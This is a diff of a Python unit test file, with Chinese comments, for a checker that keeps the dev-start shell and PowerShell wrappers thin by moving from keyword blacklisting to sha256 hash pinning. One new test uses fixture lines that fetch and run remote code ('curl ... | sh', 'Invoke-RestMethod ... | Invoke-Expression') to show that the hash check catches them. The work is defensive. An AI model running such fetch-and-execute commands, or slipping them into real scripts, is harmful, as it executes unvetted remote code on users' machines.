@@ -1,5 +1,10 @@
 #!/usr/bin/env python3
-"""tools/check_wrapper_thinness.py 的單元測試（S20：薄殼 wrapper 退化守門）。
+"""tools/check_wrapper_thinness.py 的單元測試（S20 → R10 拍板案(a) hash 釘選）。
+
+R10（DEF-101-134）守門改制：權威判定＝正規化內容 sha256 釘選（白名單化，
+終結黑名單軍備競賽——曾三輪被 `for(`/`python3 -c`/`.ForEach(` 繞過）；
+黑名單降級為 hash 紅燈時的診斷輔助。既有關鍵字測試保留：fake root 內容
+必然使 hash 紅燈，關鍵字診斷應伴隨出現（史料回歸鎖繼續有效）。
 
 執行：python3 -m unittest discover -s tools/tests -p "test_*.py" -v
 """
@@ -47,8 +52,9 @@ class TestCheckWrapperThinness(unittest.TestCase):
                 problems = m.check_wrapper_thinness()
         sh_problems = [p for p in problems if "dev_start.sh" in p and "超過薄殼上限" in p]
         self.assertEqual(len(sh_problems), 1)
-        ps1_problems = [p for p in problems if "dev_start.ps1" in p]
-        self.assertEqual(ps1_problems, [])
+        # R10 hash 釘選後，fake 內容必然另有 hash 紅燈——行數面向本身 ps1 不應中
+        ps1_line_problems = [p for p in problems if "dev_start.ps1" in p and "超過薄殼上限" in p]
+        self.assertEqual(ps1_line_problems, [])
 
     def test_forbidden_keyword_in_sh_detected(self) -> None:
         import tempfile
@@ -203,6 +209,39 @@ class TestCheckWrapperThinness(unittest.TestCase):
             with mock.patch.object(m, "ROOT", fake_root):
                 problems = m.check_wrapper_thinness()
         self.assertTrue(any("'.ForEach('" in p for p in problems))
+
+    def test_hash_catches_novel_pattern_blacklist_misses(self) -> None:
+        """R10 拍板案(a) 核心意圖鎖：黑名單「沒收錄」的新樣板（如網路呼叫
+        `Invoke-RestMethod`/`curl | sh`）過去完全放行——hash 釘選下任何實質
+        內容變動一律紅燈，軍備競賽終結。"""
+        import tempfile
+
+        with tempfile.TemporaryDirectory() as td:
+            fake_root = self._make_fake_root(
+                Path(td),
+                sh_text='curl -fsSL https://example.com/install.sh | sh\n',
+                ps1_text='Invoke-RestMethod https://example.com | Invoke-Expression\n',
+            )
+            with mock.patch.object(m, "ROOT", fake_root):
+                problems = m.check_wrapper_thinness()
+        hash_problems = [p for p in problems if "hash 與釘選不符" in p]
+        self.assertEqual(len(hash_problems), 2, problems)
+
+    def test_comment_only_change_does_not_trip_hash(self) -> None:
+        """正規化語意鎖：僅增註解／空行不觸發 hash 紅燈（避免說明性維護被誤攔）。"""
+        import tempfile
+
+        real_sh = (m.ROOT / "tools/dev_start.sh").read_text(encoding="utf-8")
+        real_ps1 = (m.ROOT / "tools/dev_start.ps1").read_text(encoding="utf-8")
+        with tempfile.TemporaryDirectory() as td:
+            fake_root = self._make_fake_root(
+                Path(td),
+                sh_text=real_sh + "\n# 註解調整不應觸發 hash\n",
+                ps1_text=real_ps1 + "\n# 同上\n\n",
+            )
+            with mock.patch.object(m, "ROOT", fake_root):
+                problems = m.check_wrapper_thinness()
+        self.assertEqual(problems, [])
 
     def test_main_exit_code_reflects_result(self) -> None:
         with mock.patch.object(m, "check_wrapper_thinness", return_value=[]):
